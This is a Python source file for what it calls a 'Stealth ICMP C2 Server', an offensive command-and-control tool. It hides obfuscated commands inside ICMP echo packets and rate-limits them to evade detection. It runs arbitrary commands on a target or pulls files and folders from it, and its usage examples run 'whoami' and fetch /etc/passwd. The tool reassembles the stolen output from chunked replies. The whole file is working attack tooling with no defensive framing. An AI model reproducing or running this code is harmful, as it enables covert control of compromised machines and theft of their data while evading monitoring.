#!/usr/bin/env python3
import os
import sys
import re
import time
from scapy.all import *
from scapy.layers.inet import IP, ICMP
from scapy.sendrecv import sniff, send
from scapy.layers.inet import Raw

# Import utility functions
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from core.utils import (
    validate_ip, create_directories, safe_file_write, obfuscate_payload, 
    deobfuscate_payload, generate_icmp_id, generate_icmp_seq, RateLimiter, 
    add_realistic_delay, get_stealth_config, generate_session_id
)

TEMP_DIR = "../data/sessions"
OUTPUT_DIR = "../data/outputs"
create_directories(TEMP_DIR, OUTPUT_DIR)

# Stealth configuration
STEALTH_MODE = os.getenv('ICMP_STEALTH_MODE', 'normal')  # stealth, normal, aggressive
stealth_config = get_stealth_config()[STEALTH_MODE]

# Rate limiter for stealth
rate_limiter = RateLimiter(
    max_packets_per_minute=stealth_config['max_packets_per_minute'],
    max_packets_per_hour=stealth_config['max_packets_per_hour']
)

def save_chunk(session_id, chunk_num, total_chunks, content):
    filename = os.path.join(TEMP_DIR, f"{session_id}_{chunk_num}.chunk")
    safe_file_write(filename, content)
    # Save (or update) the total number of chunks.
    total_file = os.path.join(TEMP_DIR, f"{session_id}_total.txt")
    safe_file_write(total_file, str(total_chunks))
    print(f"Debug: Saved chunk {chunk_num}/{total_chunks} for session {session_id}")


def load_all_chunks(session_id, total_chunks):
    chunks = []
    for i in range(1, total_chunks + 1):
        filename = os.path.join(TEMP_DIR, f"{session_id}_{i}.chunk")
        if os.path.exists(filename):
            try:
                with open(filename, "r") as f:
                    chunks.append(f.read())
            except Exception as e:
                print(f"Error reading chunk {i}: {e}")
                return None
        else:
            return None
    return "".join(chunks)


def cleanup_session(session_id):
    try:
        for filename in os.listdir(TEMP_DIR):
            if filename.startswith(session_id):
                os.remove(os.path.join(TEMP_DIR, filename))
        print(f"Debug: Cleaned up session {session_id}")
    except Exception as e:
        print(f"Error cleaning up session {session_id}: {e}")


def dynamic_sniff(filter, overall_timeout=7200, idle_timeout=60):
    start_time = time.time()
    last_packet_time = time.time()
    responses = []
    try:
        while time.time() - start_time < overall_timeout:
            new_pkts = sniff(filter=filter, timeout=5, count=1)
            if new_pkts:
                responses.extend(new_pkts)
                last_packet_time = time.time()
            else:
                if time.time() - last_packet_time >= idle_timeout:
                    break
    except Exception as e:
        print(f"Error during sniffing: {e}")
    return responses


def send_icmp_command_stealth(target_ip, payload, session_id):
    """
    Send ICMP command with stealth features (obfuscation and rate limiting)
    """
    # Validate target IP
    if not validate_ip(target_ip):
        print(f"Error: Invalid target IP address: {target_ip}")
        return
    
    # Check rate limits
    if not rate_limiter.can_send_packet():
        wait_time = rate_limiter.get_wait_time()
        print(f"Rate limit reached. Waiting {wait_time:.2f} seconds...")
        time.sleep(wait_time)
    
    # Obfuscate payload
    obfuscated_payload = obfuscate_payload(f"{payload} SESSION:{session_id}", stealth_config['obfuscation_level'])
    
    print(f"Sending stealth ICMP command to {target_ip}: {payload} (session {session_id})")
    print(f"Obfuscation level: {stealth_config['obfuscation_level']}")
    
    try:
        # Create ICMP packet with realistic parameters
        icmp_id = generate_icmp_id()
        icmp_seq = generate_icmp_seq()
        
        packet = IP(dst=target_ip) / ICMP(type=8, id=icmp_id, seq=icmp_seq) / Raw(load=obfuscated_payload)
        send(packet, verbose=False)
        rate_limiter.record_packet_sent()
        
    except Exception as e:
        print(f"Error sending stealth ICMP command: {e}")
        return

    print("Waiting for stealth ICMP responses...")
    responses = dynamic_sniff(filter="icmp", overall_timeout=60, idle_timeout=10)
    chunk_dict = {}
    expected_total = None

    for pkt in responses:
        if pkt.haslayer(ICMP) and pkt.haslayer(Raw):
            try:
                raw_payload = pkt[Raw].load.decode(errors="ignore").strip()
                
                # Try to deobfuscate payload at different levels
                reply_payload = None
                for level in [3, 2, 1]:  # Try high to low obfuscation levels
                    try:
                        deobfuscated = deobfuscate_payload(raw_payload, level)
                        if deobfuscated != raw_payload:
                            reply_payload = deobfuscated
                            print(f"Debug: Deobfuscated response (level {level})")
                            break
                    except Exception:
                        continue
                
                # If no deobfuscation worked, use original payload
                if reply_payload is None:
                    reply_payload = raw_payload
                
                # Expect header like: "[sess123][1/32] actual data"
                m = re.match(r'\[(\S+)\]\[(\d+)/(\d+)\]\s*(.*)', reply_payload)
                if m:
                    sess, chunk_num, total_chunks, content = m.groups()
                    if sess == session_id:
                        chunk_num = int(chunk_num)
                        total_chunks = int(total_chunks)
                        if expected_total is None:
                            expected_total = total_chunks
                        chunk_dict[chunk_num] = content
                        save_chunk(session_id, chunk_num, total_chunks, content)
            except Exception as e:
                print(f"Error processing response packet: {e}")

    if expected_total is None:
        print("No valid response received.")
        return

    if len(chunk_dict) != expected_total:
        max_attempts = 3
        attempts = 0
        resend_start_time = time.time()
        resend_timeout = 300  # 5 minutes total timeout for resends
        
        while len(chunk_dict) != expected_total and attempts < max_attempts:
            # Check overall timeout
            if time.time() - resend_start_time > resend_timeout:
                print(f"Resend timeout reached after {resend_timeout} seconds")
                break
                
            missing = [str(i) for i in range(1, expected_total + 1) if i not in chunk_dict]
            missing_str = ",".join(missing)
            print(f"Incomplete response: Expected {expected_total} chunks, got {len(chunk_dict)}.")
            print(f"Missing chunks: {missing_str}. Requesting resend (attempt {attempts+1})...")
            
            # Check rate limits for resend
            if not rate_limiter.can_send_packet():
                wait_time = rate_limiter.get_wait_time()
                print(f"Rate limit reached. Waiting {wait_time:.2f} seconds...")
                time.sleep(wait_time)
            
            resend_payload = f"RESEND: {missing_str} SESSION:{session_id}"
            obfuscated_resend = obfuscate_payload(resend_payload, stealth_config['obfuscation_level'])
            
            try:
                icmp_id = generate_icmp_id()
                icmp_seq = generate_icmp_seq()
                packet = IP(dst=target_ip) / ICMP(type=8, id=icmp_id, seq=icmp_seq) / Raw(load=obfuscated_resend)
                send(packet, verbose=False)
                rate_limiter.record_packet_sent()
            except Exception as e:
                print(f"Error sending resend request: {e}")
                break
                
            additional = dynamic_sniff(filter="icmp", overall_timeout=60, idle_timeout=10)
            for pkt in additional:
                if pkt.haslayer(ICMP) and pkt.haslayer(Raw):
                    try:
                        raw_payload = pkt[Raw].load.decode(errors="ignore").strip()
                        
                        # Try to deobfuscate payload
                        reply_payload = None
                        for level in [3, 2, 1]:
                            try:
                                deobfuscated = deobfuscate_payload(raw_payload, level)
                                if deobfuscated != raw_payload:
                                    reply_payload = deobfuscated
                                    break
                            except Exception:
                                continue
                        
                        if reply_payload is None:
                            reply_payload = raw_payload
                        
                        m = re.match(r'\[(\S+)\]\[(\d+)/(\d+)\]\s*(.*)', reply_payload)
                        if m:
                            sess, chunk_num, total_chunks, content = m.groups()
                            if sess == session_id:
                                chunk_num = int(chunk_num)
                                chunk_dict[chunk_num] = content
                                save_chunk(session_id, chunk_num, expected_total, content)
                    except Exception as e:
                        print(f"Error processing resend packet: {e}")
            attempts += 1

        if len(chunk_dict) != expected_total:
            print(f"Still incomplete: Expected {expected_total} chunks, got {len(chunk_dict)}.")
            return

    full_response = "".join([chunk_dict[i] for i in sorted(chunk_dict.keys())])
    print("Full Response Received:\n" + full_response)

    output_filename = os.path.join(OUTPUT_DIR, f"response_{session_id}_{int(time.time())}.txt")
    if safe_file_write(output_filename, full_response):
        print(f"Saved full response to {output_filename}")
    else:
        print("Warning: Failed to save response to file")

    cleanup_session(session_id)


if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Stealth ICMP C2 Server")
        print("Usage: python icmp_c2_server.py <TARGET_IP> <MODE: cmd|file|folder> <COMMAND_OR_PATH>")
        print("Environment variables:")
        print("  ICMP_STEALTH_MODE: stealth|normal|aggressive (default: normal)")
        print("\nExamples:")
        print("  ICMP_STEALTH_MODE=stealth python icmp_c2_server.py 192.168.1.100 cmd 'whoami'")
        print("  python icmp_c2_server.py 192.168.1.100 file /etc/passwd")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    mode = sys.argv[2].lower()
    command_or_path = " ".join(sys.argv[3:])
    
    # Validate inputs
    if not validate_ip(target_ip):
        print(f"Error: Invalid IP address: {target_ip}")
        sys.exit(1)
    
    if mode not in ["cmd", "file", "folder"]:
        print("Error: Invalid mode. Use 'cmd', 'file', or 'folder'.")
        sys.exit(1)
    
    # Use improved session ID generation
    session_id = generate_session_id()

    print(f"Stealth Mode: {STEALTH_MODE}")
    print(f"Configuration: {stealth_config}")

    # Construct the payload automatically based on the mode.
    if mode == "cmd":
        payload = f"CMD:TASK:{command_or_path}"
    elif mode in ["file", "folder"]:
        payload = f"CMD:GET:{command_or_path}"
    else:
        print("Invalid mode. Use 'cmd', 'file', or 'folder'.")
        sys.exit(1)

    send_icmp_command_stealth(target_ip, payload, session_id)
